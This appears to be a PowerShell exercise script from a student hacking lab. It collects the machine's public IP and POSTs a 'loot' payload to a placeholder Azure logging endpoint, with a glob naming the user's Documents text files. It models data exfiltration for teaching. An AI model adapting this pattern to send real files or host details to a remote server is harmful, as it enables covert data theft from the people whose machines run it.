## Replace this with your Azure Web App URL.
$serviceUrl = "https://<your-student-lab>.azurewebsites.net/log"

# Required payload fields:
# - student_id
# - hacker_handle
# - filename
# - public_ip
# - data (PowerShell glob / capture string)

$publicIp = (Invoke-RestMethod -Uri "https://api.ipify.org" -UseBasicParsing).Trim()

$payload = @{
    student_id = "STU-001"
    hacker_handle = "neo"
    filename = "loot.txt"
    public_ip = $publicIp
    data = "C:\Users\$env:USERNAME\Documents\*.txt"
}

$response = Invoke-RestMethod -Uri $serviceUrl -Method POST -Body ($payload | ConvertTo-Json -Compress) -ContentType "application/json"

$response